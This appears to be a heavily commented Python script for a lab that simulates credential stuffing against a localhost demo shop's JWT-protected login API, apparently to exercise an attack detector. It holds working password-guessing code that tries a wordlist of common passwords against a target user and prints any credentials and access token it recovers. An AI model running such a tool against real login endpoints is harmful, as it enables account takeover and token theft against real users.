# stuffingwithjwt.py — tests how hacking vulnerable APU's and accounts can lead to retrieval of JWT tokens
# which can allow hackers to pretend to be the user which simulates unauthorised entry into the system.

# why these imports? simply because these imports allow for the direct communication between
# -> the terminal and the file
import argparse
import json
import sys
from typing import Iterable, Optional, Dict


# requests is a common python library used for sending HTTP requests.
# This is what gives ouur application the ability to communicate with the demo-shop and the backend
import requests

# my original attack function
from stuffing import attack

# This list contains a small set of common or default passwords which is also a common brute force technique
# this is also oour failsafe methods becuase if the user didnt privde their own list of passwrods using the --wordslist
# command, we can just use default_words as a a way to discover the stolen credentials.
# Default words can also be replaced with the rock-you list which is found in the repo
# but for 'demonstration purposes we will use this'
DEFAULT_WORDS = ["wrongpass", "123456", "password1", "secret", "letmein"]

# This function is responsible for building a list of passwords that will be tested ->
# real worls situations would use their own database, but for tetsing purposes this is what we are going to use

# It looks at the command-line arguments provided by the user and decides where to get the list from.
# The order of priority is:
#   1) Use a comma-separated list of passwords given directly by the user (--passwords) ->
# Here the user can create their own list or do what they want but if they want to supply their liat,
# it needs to be comma seperated values
#   2) If no direct list was given, try to load them from a text file (--wordlist) so users can implement
# a file in their repository and load the passwords from it
#   3) If neither was provided, fall back to a built-in default list (DEFAULT_WORDS)
def load_passwords(dataInfo) -> Iterable[str]:
        # Split that comma-separated string into individual words
        # Remove any leading/trailing spaces around each password so it is pure string
        # Skip any blank entries (in case of extra commas) for error prevention
    if dataInfo.passwords:
        return [p.strip() for p in dataInfo.passwords.split(",") if p.strip()]
    if dataInfo.wordlist:
        with open(dataInfo.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    return DEFAULT_WORDS

# This function tries to log in to the given system using password guesses
# It will return a dictionary containing { "username", "password", "token"}
# if one of the guests work, otherwise it will return nothings


def discover_creds(
    base_url: str, # the main address of the system i'm sending the request to
    user: str, # the username i'm trying to hack into
    passwords: Iterable[str], # a list of password's i'm trying to try
    api_key: Optional[str] = None, # An API key for extra authentication, if required
    timeout: float = 10.0, # How long to wait before giving up on each network request
) -> Optional[Dict[str, str]]: # return the result as a dictionaru

    # initialises a header and checks if an API key was provided,
    headers = {}
    if api_key:
        headers["X-API-Key"] = api_key  # usually not required for /login, but safe

    # makes the login URL and appends it to the "/login" to target the login page or API endpoint
    login_url = f"{base_url.rstrip('/')}/login"

    # loops through each password and tests it on the username
    for passwordValue in passwords:
        try:
            # Send an HTTP POST request to the login URL
            # turn it into JSON with the credentials 
            #the headers are included as well
            # setted a timeeout so we dont wait forever.
            resp = requests.post(
                login_url,
                json={"username": user, "password": passwordValue},
                headers=headers,
                timeout=timeout,
            )

        # if there is a network connection error (like timeout, connection refused, etc),
        # continue to the next password
        except requests.RequestException:
            continue
        
        # check if the server's response  is 200 
        # if it was the login worked which meant that we found the password
        # read the JSON for data
        # take then token and if there is no token return nothing.
        if resp.status_code == 200:
            token = ""
            try:
                data = resp.json()
                token = data.get("access_token", "") or ""
            except Exception:
                pass
            return {"username": user, "password": passwordValue, "token": token}

    return None

# Here i define a method called main which is going to be the function that is called when the user 
# enters the command in the terminal such as stuffingwithjwt.py --'name' either Alice or Ben
def main():

    # This line of code is respobsible for simulating the credential stuffing that retrieves the username, 
    # password and token data. This part of the code uses the argparse librar for attacks against a JWT-protected 
    # API. 
    credStuffingAttackData = argparse.ArgumentParser(
        description="Simulate credential stuffing against the JWT-protected API (and print discovered test creds)."
    )

    # These are all the acceptable areguments that are allowed to be used in ther terminal.
    # These also allow the script to run dynamically
    credStuffingAttackData.add_argument("--rate", type=float, default=5, help="Attempts per second")
    credStuffingAttackData.add_argument("--attempts", type=int, default=50, help="Number of attempts to send")
    credStuffingAttackData.add_argument("--user", default="alice", help="User to target")
    credStuffingAttackData.add_argument("--score-base", default="http://localhost:8001", help="Detector API base URL")
    credStuffingAttackData.add_argument("--shop-url", default="http://localhost:3005", help="Demo shop base URL")
    credStuffingAttackData.add_argument("--api-key", help="API key for protected endpoints")
    credStuffingAttackData.add_argument("--chain-url", default="/api/security/chain", help="Endpoint to fetch rotating chain value")

    # NEW: ways to control the discovery pass
    credStuffingAttackData.add_argument("--wordlist", help="Path to a newline-delimited password list")
    credStuffingAttackData.add_argument(
        "--passwords",
        help="Comma-separated password list (overrides --wordlist). Example: 'foo,bar,baz'",
    )
    credStuffingAttackData.add_argument(
        "--exit-on-found",
        action="store_true",
        help="Print the discovered creds JSON and exit without running the full attack",
    )

    # This line basically builds all the command-line arguments and processes it.
    # to bring the desired output where are looking for 
    dataInfoChecker = credStuffingAttackData.parse_args()

    # 1) Call the eariler function to load the password and check wether the password was from the user
    # or load the password from the command line prompt
    pw_candidates = load_passwords(dataInfoChecker)

    # Then we try if the password is working in which we call the discover creds method 
    # providing it with a list of arguments
    # If a working combination is found then we return it as a dictionary
    found = discover_creds(
        base_url=dataInfoChecker.score_base, user=dataInfoChecker.user, passwords=pw_candidates, api_key=dataInfoChecker.api_key)

    # Check if the discover_cred() function found a calid login
    if found:

        ## if there is, print out the discovered information (username, password and token)
        # return it JSON format
        # chekc if user has included the exit-on-found setting, which stops the script when the right password is found
        # if they did, the program would end and otherwise the program would continue
        print(json.dumps(found), flush=True)
        if dataInfoChecker.exit_on_found:
            sys.exit(0)
        
    else:

        # If no valid option was found the code should just print something in JSON such as 'null'
        # so every output is consistent and simple to load
        # we then return the username and mark the token as none
        print(json.dumps({"username": dataInfoChecker.user, "password": None, "token": None}), flush=True)

    # 2) If we didn't exit early, continue with the main simulation process.
    # This calls the attck() function that was imported earlier
    # The goal here is to keep running the credential-stuffing simulator in "JWT mode"
    # which mimics how repeated login attempts would look when hackers are focused on 'JWT-Protected API"
    attack(
        rate_per_sec=dataInfoChecker.rate,
        attempts=dataInfoChecker.attempts,
        use_jwt=True,
        score_base=dataInfoChecker.score_base,
        shop_url=dataInfoChecker.shop_url,
        api_key=dataInfoChecker.api_key,
        chain_url=dataInfoChecker.chain_url,
        user=dataInfoChecker.user,
    )

if __name__ == "__main__":
    main()
